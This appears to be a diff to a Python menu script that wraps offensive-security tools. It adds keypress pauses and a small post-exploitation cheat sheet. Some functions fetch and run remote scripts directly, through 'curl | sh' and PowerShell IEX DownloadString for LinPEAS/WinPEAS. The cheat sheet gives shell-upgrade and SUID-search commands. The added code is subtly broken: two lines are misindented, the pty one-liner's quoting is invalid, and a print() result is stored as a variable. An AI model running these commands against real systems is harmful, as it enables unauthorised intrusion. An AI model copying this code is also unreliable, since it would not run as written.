@@ -42,24 +42,29 @@ def gobuster():
     wordlist = input("Enter the path to the wordlist: ")
     command = f"gobuster dir -u {url} -w {wordlist} -o gobuster_results.txt"
     run_command(command)
+    wait_for_keypress()
     
 def ffuf():
     url = input ("Enter the url, must be http: ")
     command = f"ffuf -w /usr/share/wordlists/dirb/big.txt -H 'Host:FUZZ.{url}' -u 'http://{url}'"
     run_command(command)
+    wait_for_keypress()
     
 def nmap():
     target = input("Enter the target IP or hostname: ")
     command = f"nmap -p- -T4 --min-rate=1000 {target} -A -oN nmap_results.txt"
     run_command(command)
+    wait_for_keypress()
 
 def linpeas():
     command = "curl -Ls https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh"
     run_command(command)
+     wait_for_keypress()
 
 def winpeas():
     command = "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat')\""
     run_command(command)
+     wait_for_keypress()
 
 def SQLMap():
     url = input("Target url: ")
@@ -104,6 +109,7 @@ def version_scan_windows():
     for command in commands:
         print(f"\nRunning: {command}")
         run_command(command)
+    wait_for_keypress()
 
 def version_scan():
     system = platform.system()
@@ -113,6 +119,14 @@ def version_scan():
         version_scan_windows()
     else:
         print(f"Unsupported operating system: {system}")
+
+def Basic_Cheat_Sheet():
+    Cheat_sheet = print(r"""
+    Upgrade shell to tty: python3 -c 'import pty; pty.spawn('/bin/bash')'
+    Writeable permission? *Linux: echo $PATH
+    SUID Libraries *Linux: find / -perm -4000 2>/dev/null
+    """)
+    
 
 def main():
     while True:
